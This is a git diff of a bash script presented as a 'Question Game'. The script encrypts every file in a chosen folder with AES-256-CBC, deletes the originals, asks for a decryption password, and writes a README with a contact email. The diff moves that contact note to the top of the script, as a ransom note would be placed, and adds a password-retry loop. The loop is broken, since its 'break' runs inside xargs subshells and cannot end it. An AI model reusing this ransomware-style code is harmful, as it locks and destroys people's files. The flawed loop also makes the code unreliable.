@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Create a README.md file with contact details
+echo "Contact Information:" > README.md
+echo "Email: semaemirhan555@gmail.com" >> README.md
+
 # Prompt the user with a question game
 echo "Welcome to the Question Game!"
 echo "Answer the following question to proceed."
@@ -30,6 +34,7 @@ if [ ! -d "$folder_to_encrypt" ]; then
     exit 1
 fi
 
+# Function to encrypt files
 encrypt_files() {
     local file="$1"
     
@@ -48,26 +53,34 @@ find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'e
 
 echo "All files have been encrypted, and unencrypted files have been deleted."
 
-# Prompt the user for the decryption password
-read -s -p "Enter the decryption password: " decryption_password
-echo
+# Loop for decryption with password verification
+while true; do
+    # Prompt the user for the decryption password
+    read -s -p "Enter the decryption password: " decryption_password
+    echo
 
-decrypt_files() {
-    local encrypted_file="$1"
-    local original_file="${encrypted_file%.enc}"  # Remove the .enc extension
+    # Function to decrypt files
+    decrypt_files() {
+        local encrypted_file="$1"
+        local original_file="${encrypted_file%.enc}"  # Remove the .enc extension
 
-    # Decrypt the file using AES-256-CBC
-    openssl enc -aes-256-cbc -d -in "$encrypted_file" -out "$original_file" -pass "pass:$decryption_password" > /dev/null 2>&1
-    # Remove the encrypted file
-    rm "$encrypted_file" > /dev/null 2>&1
-}
+        # Decrypt the file using AES-256-CBC
+        openssl enc -aes-256-cbc -d -in "$encrypted_file" -out "$original_file" -pass "pass:$decryption_password" > /dev/null 2>&1
 
-export -f decrypt_files
+        # Check if decryption was successful
+        if [ $? -eq 0 ]; then
+            # Remove the encrypted file
+            rm "$encrypted_file" > /dev/null 2>&1
+            echo "Decryption successful."
+            break  # Exit the loop
+        else
+            echo "Incorrect password. Please try again."
+        fi
+    }
 
-find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
+    export -f decrypt_files
+
+    find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
+done
 
 echo "All files have been decrypted, and encrypted files have been deleted."
-
-# Create a README.md file with contact details
-echo "Contact Information:" > README.md
-echo "Email: semaemirhan555@gmail.com" >> README.md
